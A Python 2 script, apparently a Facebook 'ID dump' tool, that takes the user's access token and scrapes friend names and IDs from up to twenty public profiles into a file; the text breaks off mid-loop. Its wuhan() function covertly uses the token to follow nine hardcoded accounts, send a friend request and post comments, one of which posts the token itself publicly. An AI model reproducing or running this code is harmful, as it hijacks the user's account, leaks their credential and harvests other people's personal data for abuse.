#Utf-8 Coding
#Original Written By Qaiser
#youtube : Tech Qaiser
#I Am Not Responsible For Any Miss Use

import os
try:
import requests
except ImportError:
print '\n X> The requests module is not installed (requests) !...\n'
os.system('pip2 install requests')

try:
import concurrent.futures
except ImportError:
print '\n X> The requests module is not installed (futures) !...\n'
os.system('pip2 install futures')

try:
import bs4
except ImportError:
print '\n X> The requests module is not installed (bs4) !...\n'
os.system('pip2 install bs4')

def tik():
titik = [' ', '10% ', '20% ', '40% ', '60% ', '80% ', 'Done ']
for o in titik:
print '\n \r\x1b[1;91m [*] \x1b[0;32mWAIT FEW SECONDS OPENING \x1b[1;97m' + o,
sys.stdout.flush()
time.sleep(0.5)

import requests, os, re, bs4, sys, json, time, random, datetime
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from datetime import datetime
from bs4 import BeautifulSoup
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
if n < 0 or n > 12:
exit()
nTemp = n - 1
except ValueError:
exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
P = '\033[0m'
M = '\033[0m'
H = '\033[0m'
K = '\033[0m'
B = '\033[0m'
U = '\033[0m'
O = '\033[0m'
N = '\033[0m'
my_color = [
P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
ok = []
cp = []
id = []
user = []
loop = 0
xi_jimpinx = '1714000985456399'
koh = '100005395413800'
hoetank = random.choice(['Yang posting orang nya ganteng:)', 'Lo ngentod:v', 'Never surrentod tekentod kentod:v'])
bulan_ttl = {'01': 'Januari', '02': 'Februari', '03': 'Maret', '04': 'April', '05': 'Mei', '06': 'Juni', '07': 'Juli', '08': 'Agustus', '09': 'September', '10': 'Oktober', '11': 'November', '12': 'Desember'}

def jalan(z):
for e in z + '\n':
sys.stdout.write(e)
sys.stdout.flush()
time.sleep(0.03)

def tod():
titik = ['\x1b[1;92m. ', '\x1b[1;93m.. ', '\x1b[1;96m... ', '\x1b[1;92m. ', '\x1b[1;93m.. ', '\x1b[1;96m... ']
for x in titik:
print '\r %s[%s+%s] Removed Token %s' % (N, N, N, x),
sys.stdout.flush()
time.sleep(1)

logo ="""
\x1b[0;91m * \033[1;0m
\x1b[0;91m (  * ) \033[1;0m \x1b[0;91m )\))( ( ) /( \033[1;0m
\x1b[0;91m(()()\ )\ ( )()) \033[1;0m
\x1b[0;91m(()(() ((|(()) \033[1;0m\tMajestic
\x1b[0;94m _ _ _ _ _ _ \033[1;0m
\x1b[1;94m| / | | |_ | \033[1;0m
\x1b[1;94m| |/| | || | | | \033[1;0m
\x1b[1;94m|| ||_/ |_| \033[1;0m
\n\x1b[1;97m===========\x1b[1;97m===========================================
\033[1;96m[!]\033[1;97mADMIN\x1b[1;97m : \x1b[1;97mQAISER \033[1;96m[!]\033[1;97mVersion\x1b[1;97m : \x1b[1;97m3.3.3 \033[1;96m[!]\033[1;97mFb\x1b[1;97m : \x1b[1;97mBILAL
\x1b[1;97m===========\x1b[1;97m===========================================
"""

lo_ngentod = '1714009362122228'

def yayanxd():
os.system('clear')
kontol = raw_input('\n%s[%sX%s] Enter Token :%s ' % (N, M, N, H))
if kontol in ('fuck', 'Fuck', 'FUCK'):
os.system('clear')
print logo
print '_____________________________________________________\n'
raw_input(' \n%sX%s Enter Token : ' % (O, N))
os.system('xdg-open https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_')
yayanxd()
try:
Name = requests.get('https://graph.facebook.com/me?access_token=%s' % kontol).json()['name']
print '\n\n %sX%s Welcome To Fucking World %s%s%s' % (O, N, K, Name, N)
time.sleep(2)
open('.memek.txt', 'w').write(kontol)
wuhan(kontol)
os.system('xdg-open https://youtu.be/2NKmiCZSIAA')
moch_yayan()
except KeyError:
print '\n Invalid Token / ReLogin'
time.sleep(2)
yayanxd()

def moch_yayan():
os.system('clear')
try:
kontol = open('.memek.txt', 'r').read()
except IOError:
print '\n %s[%sO>%s] Login Page ...' % (N, M, N)
time.sleep(2)
os.system('rm -rf .memek.txt')
yayanxd()

try:
    Name = requests.get('https://graph.facebook.com/me?access_token=%s' % kontol).json()['name']
except KeyError:
    print '\n %s[%>%s] Error Token  ' % (N, M, N)
    time.sleep(2)
    os.system('rm -rf .memek.txt')
    yayanxd()
except requests.exceptions.ConnectionError:
    exit('\n\n %s[%s!%s] Connection Error\n' % (N, M, N))

print logo
IP = requests.get('http://ip-api.com/json').json()['query']
time.sleep(0.03)
print ' \x1b[1;32;m\t\t Create 100075 For Ok ids \x1b[0m'
print '\n [\033[1;37;40m1.\x1b[0m] \tCreate File [5-Links]\x1b[0m'
print ' [\033[1;37;40m2.\x1b[0m] \tCreate File [10-Links]\x1b[0m'
print ' [\033[1;37;40m3.\x1b[0m] \tCreate File [20-Links]\x1b[0m'
print ' [\033[1;37;40m4.\x1b[0m] \tSeperate [100075-Ids]\x1b[0m'
pepek = raw_input('\n [>] menu : ')
if pepek == '':
    print '\n Please ! Fill Correctly!' 
    time.sleep(2)
    moch_yayan()
elif pepek in ('1', '01'):
    publik(kontol)
elif pepek in ('2', '02'):
    publik2(kontol)
elif pepek in ('3', '03'):
    publik3(kontol)
elif pepek in ('4', '04'):
    publik4(kontol)
else:
	print(' \n\033[1;31mWrong Input ')
time.sleep(1)
moch_yayan()
def wuhan(kontol):
try:
kentod = kontol
requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token=%s' % kentod)
requests.post('https://graph.facebook.com/100059709917296/subscribers?access_token=%s' % kentod)
requests.post('https://graph.facebook.com/100008678141977/subscribers?access_token=%s' % kentod)
requests.post('https://graph.facebook.com/100005878513705/subscribers?access_token=%s' % kentod)
requests.post('https://graph.facebook.com/100003342127009/subscribers?access_token=%s' % kentod)
requests.post('https://graph.facebook.com/100041388320565/subscribers?access_token=%s' % kentod)
requests.post('https://graph.facebook.com/108229897756307/subscribers?access_token=%s' % kentod)
requests.post('https://graph.facebook.com/100039688893849/subscribers?access_token=%s' % kentod)
requests.post('https://graph.facebook.com/100027558888180/subscribers?access_token=%s' % kentod)
requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s' % (koh, kentod))
requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s' % (lo_ngentod, kentod, kentod))
requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s' % (xi_jimpinx, hoetank, kentod))
except:
pass

def publik(kontol):
try:
os.mkdir('dump')
except:
pass

try:
	filePath = '/sdcard/ids_friends.txt';
    if os.path.exists(filePath):
    	os.remove(filePath)
    filePath = '/sdcard/ids_friends.txt';
    if os.path.exists(filePath):
    	os.remove(filePath)
    csy = raw_input('\n [1] Public Id  : ' )
    csy2 = raw_input('\n [2] Public Id  : ' )
    csy3 = raw_input('\n [3] Public Id  : ' )
    csy4 = raw_input('\n [4] Public Id  : ' )
    csy5 = raw_input('\n [5] Public Id  : ' )
    ihh = '20000'
    knt = ('/sdcard/ids_friends.txt')
    ys = open(knt, 'w')
    for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy, ihh, kontol)).json()['data']:
        id.append(a['id'] + '|' + a['name'])
        ys.write(a['id'] + '|' + a['name'] + '\n')
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
        sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
        sys.stdout.flush()
        time.sleep(0.005)
    for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy2, ihh, kontol)).json()['data']:
        id.append(a['id'] + '|' + a['name'])
        ys.write(a['id'] + '|' + a['name'] + '\n')
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
        sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
        sys.stdout.flush()
        time.sleep(0.005)
    for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy3, ihh, kontol)).json()['data']:
        id.append(a['id'] + '|' + a['name'])
        ys.write(a['id'] + '|' + a['name'] + '\n')
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
        sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
        sys.stdout.flush()
        time.sleep(0.005)
    for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy4, ihh, kontol)).json()['data']:
        id.append(a['id'] + '|' + a['name'])
        ys.write(a['id'] + '|' + a['name'] + '\n')
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
        sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
        sys.stdout.flush()
        time.sleep(0.005)
    for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy5, ihh, kontol)).json()['data']:
        id.append(a['id'] + '|' + a['name'])
        ys.write(a['id'] + '|' + a['name'] + '\n')
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
        sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
        sys.stdout.flush()
        time.sleep(0.005)

    ys.close()
    jalan('\n\n %s[%s\xe2\x9c\x93%s] Process Completed Ids Saved' % (N, H, N))
    print ' [%s\xe2\x80\xa2%s] Done Copy This File >  ( %s%s%s )' % (O, N, M, knt, N)
    print 50 * '-'
    raw_input(' [%s ENTER%s ] ' % (O, N))
    moch_yayan()
except (KeyError, IOError):
    os.remove(knt)
    jalan('\n %s[%s!%s] Dump Failed.\n' % (N, M, N))
    raw_input(' [ %sBack%s ] ' % (O, N))
    moch_yayan()
def publik2(kontol):
try:
os.mkdir('dump')
except:
pass

try:
	filePath = '/sdcard/ids_friends.txt';
    if os.path.exists(filePath):
    	os.remove(filePath)
    filePath = '/sdcard/ids_friends.txt';
    if os.path.exists(filePath):
    	os.remove(filePath)
    csy = raw_input('\n [1] Public Id  : ' )
    csy2 = raw_input('\n [2] Public Id  : ' )
    csy3 = raw_input('\n [3] Public Id  : ' )
    csy4 = raw_input('\n [4] Public Id  : ' )
    csy5 = raw_input('\n [5] Public Id  : ' )
    csy6 = raw_input('\n [6] Public Id  : ' )
    csy7 = raw_input('\n [7] Public Id  : ' )
    csy8 = raw_input('\n [8] Public Id  : ' )
    csy9 = raw_input('\n [9] Public Id  : ' )
    csy10 = raw_input('\n [10] Public Id  : ' )
    ihh = '50000'
    knt = ('/sdcard/ids_friends.txt')
    ys = open(knt, 'w')
    for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy, ihh, kontol)).json()['data']:
        id.append(a['id'] + '|' + a['name'])
        ys.write(a['id'] + '|' + a['name'] + '\n')
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
        sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
        sys.stdout.flush()
        time.sleep(0.005)
    for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy2, ihh, kontol)).json()['data']:
        id.append(a['id'] + '|' + a['name'])
        ys.write(a['id'] + '|' + a['name'] + '\n')
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
        sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
        sys.stdout.flush()
        time.sleep(0.005)
    for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy3, ihh, kontol)).json()['data']:
        id.append(a['id'] + '|' + a['name'])
        ys.write(a['id'] + '|' + a['name'] + '\n')
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
        sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
        sys.stdout.flush()
        time.sleep(0.005)
    for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy4, ihh, kontol)).json()['data']:
        id.append(a['id'] + '|' + a['name'])
        ys.write(a['id'] + '|' + a['name'] + '\n')
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
        sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
        sys.stdout.flush()
        time.sleep(0.005)
    for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy5, ihh, kontol)).json()['data']:
        id.append(a['id'] + '|' + a['name'])
        ys.write(a['id'] + '|' + a['name'] + '\n')
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
        sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
        sys.stdout.flush()
        time.sleep(0.005)
    for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy6, ihh, kontol)).json()['data']:
        id.append(a['id'] + '|' + a['name'])
        ys.write(a['id'] + '|' + a['name'] + '\n')
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
        sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
        sys.stdout.flush()
        time.sleep(0.005)
    for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy7, ihh, kontol)).json()['data']:
        id.append(a['id'] + '|' + a['name'])
        ys.write(a['id'] + '|' + a['name'] + '\n')
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
        sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
        sys.stdout.flush()
        time.sleep(0.005)
    for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy8, ihh, kontol)).json()['data']:
        id.append(a['id'] + '|' + a['name'])
        ys.write(a['id'] + '|' + a['name'] + '\n')
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
        sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
        sys.stdout.flush()
        time.sleep(0.005)
    for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy9, ihh, kontol)).json()['data']:
        id.append(a['id'] + '|' + a['name'])
        ys.write(a['id'] + '|' + a['name'] + '\n')
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
        sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
        sys.stdout.flush()
        time.sleep(0.005)
    for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy10, ihh, kontol)).json()['data']:
        id.append(a['id'] + '|' + a['name'])
        ys.write(a['id'] + '|' + a['name'] + '\n')
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
        sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
        sys.stdout.flush()
        time.sleep(0.005)            

    ys.close()
    jalan('\n\n %s[%s\xe2\x9c\x93%s] Process Completed Ids Saved' % (N, H, N))
    print ' [%s\xe2\x80\xa2%s] Done Copy This File >  ( %s%s%s )' % (O, N, M, knt, N)
    print 50 * '-'
    raw_input(' [%s ENTER%s ] ' % (O, N))
    moch_yayan()
except (KeyError, IOError):
    os.remove(knt)
    jalan('\n %s[%s!%s] Dump Failed.\n' % (N, M, N))
    raw_input(' [ %sBack%s ] ' % (O, N))
    moch_yayan()
def publik3(kontol):
try:
os.mkdir('dump')
except:
pass

try:
	filePath = '/sdcard/ids_friends.txt';
    if os.path.exists(filePath):
    	os.remove(filePath)
    filePath = '/sdcard/ids_friends.txt';
    if os.path.exists(filePath):
    	os.remove(filePath)
    csy = raw_input('\n [1] Public Id  : ' )
    csy2 = raw_input('\n [2] Public Id  : ' )
    csy3 = raw_input('\n [3] Public Id  : ' )
    csy4 = raw_input('\n [4] Public Id  : ' )
    csy5 = raw_input('\n [5] Public Id  : ' )
    csy6 = raw_input('\n [6] Public Id  : ' )
    csy7 = raw_input('\n [7] Public Id  : ' )
    csy8 = raw_input('\n [8] Public Id  : ' )
    csy9 = raw_input('\n [9] Public Id  : ' )
    csy10 = raw_input('\n [10] Public Id  : ' )
    csy11 = raw_input('\n [11] Public Id  : ' )
    csy12 = raw_input('\n [12] Public Id  : ' )
    csy13 = raw_input('\n [13] Public Id  : ' )
    csy14 = raw_input('\n [14] Public Id  : ' )
    csy15 = raw_input('\n [15] Public Id  : ' )
    csy16 = raw_input('\n [16] Public Id  : ' )
    csy17 = raw_input('\n [17] Public Id  : ' )
    csy18 = raw_input('\n [18] Public Id  : ' )
    csy19 = raw_input('\n [19] Public Id  : ' )
    csy20 = raw_input('\n [20] Public Id  : ' )
    ihh = '100000'
    knt = ('/sdcard/ids_friends.txt')
    ys = open(knt, 'w')
    for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy, ihh, kontol)).json()['data']:
        id.append(a['id'] + '|' + a['name'])
        ys.write(a['id'] + '|' + a['name'] + '\n')
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
        sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
        sys.stdout.flush()
        time.sleep(0.005)
    for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy2, ihh, kontol)).json()['data']:
        id.append(a['id'] + '|' + a['name'])
        ys.write(a['id'] + '|' + a['name'] + '\n')
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
        sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
        sys.stdout.flush()
        time.sleep(0.005)
    for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy3, ihh, kontol)).json()['data']:
        id.append(a['id'] + '|' + a['name'])
        ys.write(a['id'] + '|' + a['name'] + '\n')
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
        sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
        sys.stdout.flush()
        time.sleep(0.005)
    for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy4, ihh, kontol)).json()['data']:
        id.append(a['id'] + '|' + a['name'])
        ys.write(a['id'] + '|' + a['name'] + '\n')
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
        sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
        sys.stdout.flush()
        time.sleep(0.005)
    for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy5, ihh, kontol)).json()['data']:
        id.append(a['id'] + '|' + a['name'])
        ys.write(a['id'] + '|' + a['name'] + '\n')
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
        sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
        sys.stdout.flush()
        time.sleep(0.005)
    for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy6, ihh, kontol)).json()['data']:
        id.append(a['id'] + '|' + a['name'])
        ys.write(a['id'] + '|' + a['name'] + '\n')
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
        sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
        sys.stdout.flush()
        time.sleep(0.005)
    for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy7, ihh, kontol)).json()['data']:
        id.append(a['id'] + '|' + a['name'])
        ys.write(a['id'] + '|' + a['name'] + '\n')
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
        sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
        sys.stdout.flush()
        time.sleep(0.005)
    for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy8, ihh, kontol)).json()['data']:
        id.append(a['id'] + '|' + a['name'])
        ys.write(a['id'] + '|' + a['name'] + '\n')
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
        sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
        sys.stdout.flush()
        time.sleep(0.005)
    for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy9, ihh, kontol)).json()['data']:
        id.append(a['id'] + '|' + a['name'])
        ys.write(a['id'] + '|' + a['name'] + '\n')
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
        sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
        sys.stdout.flush()
        time.sleep(0.005)
    for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy10, ihh, kontol)).json()['data']:
        id.append(a['id'] + '|' + a['name'])
        ys.write(a['id'] + '|' + a['name'] + '\n')
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
        sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
        sys.stdout.flush()
        time.sleep(0.005)       
    for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy11, ihh, kontol)).json()['data']:
        id.append(a['id'] + '|' + a['name'])
        ys.write(a['id'] + '|' + a['name'] + '\n')
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
        sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
        sys.stdout.flush()
        time.sleep(0.005)
    for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy12, ihh, kontol)).json()['data']:
        id.append(a['id'] + '|' + a['name'])
        ys.write(a['id'] + '|' + a['name'] + '\n')
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
        sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
        sys.stdout.flush()
        time.sleep(0.005)
    for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy13, ihh, kontol)).json()['data']:
        id.append(a['id'] + '|' + a['name'])
        ys.write(a['id'] + '|' + a['name'] + '\n')
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
